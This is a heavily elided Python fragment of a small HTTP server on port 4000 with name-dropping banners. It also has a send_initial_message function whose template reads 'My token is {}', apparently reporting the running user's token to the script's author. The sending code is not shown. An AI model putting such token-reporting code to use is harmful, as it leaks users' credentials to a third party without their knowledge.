...
class MyHandler(http.server.SimpleHTTPRequestHandler):
      def do_GET(self):
          ...
          self.end_headers()
          self.wfile.write(b"-- SERVER RUNNING>>ABHI'S WIFE SIYA RAJPUT HERW")
def execute_server():
      PORT = 4000
...
def send_initial_message():
      ...
      msg_template = "Hello Abhi's wife siya! I am using your server. My token is {}"
      ...
      def liness():
          print('\033[1;92m' + '•──────────────────────ABHI X SIYA D0N HERE ───────────────────────────────•')
